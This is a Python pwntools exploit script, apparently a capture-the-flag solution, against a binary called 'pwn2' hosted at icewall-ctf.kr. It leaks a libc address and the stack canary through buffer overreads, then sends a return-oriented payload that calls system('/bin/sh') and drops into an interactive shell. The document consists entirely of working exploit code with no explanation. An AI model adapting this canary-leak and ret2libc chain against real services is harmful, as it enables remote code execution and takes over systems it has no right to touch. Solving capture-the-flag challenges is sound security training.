from pwn import *
import sys

pop_rsi = 0x4008d1
pop_rdi_ret = 0x4008d3

l = ELF("./libc.so.6")

if len(sys.argv) == 1:
	p = process("./pwn2")
else:
	p = remote("icewall-ctf.kr", 24002)

p.recvuntil("PWN2 by DelspoN")

payload = "a"*15
p.sendline(payload)
p.recvuntil(payload+"\n")
leak = u64(p.recvuntil("\x7f").ljust(8,"\x00"))
libc = leak - 0x3c56a3
system = libc + l.symbols['system']
binsh = libc + next(l.search("/bin/sh"))
log.info("leak   = 0x%x" % leak)
log.info("libc   = 0x%x" % libc)
log.info("system = 0x%x" % system)
log.info("binsh  = 0x%x" % binsh)

p.recvuntil("continue? (y/n) : ")
p.send('y')

payload = "a"*136
p.sendline(payload)
p.recvuntil(payload)
canary = u64(p.recv(8)) - 0x0a
log.info("canary = 0x%x" % canary)

p.recvuntil("continue? (y/n) : ")
p.send('y')

payload  = "a" * 136
payload += p64(canary)
payload += "b" * 8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.recvuntil("continue? (y/n) : ")
p.send('n')

p.interactive()
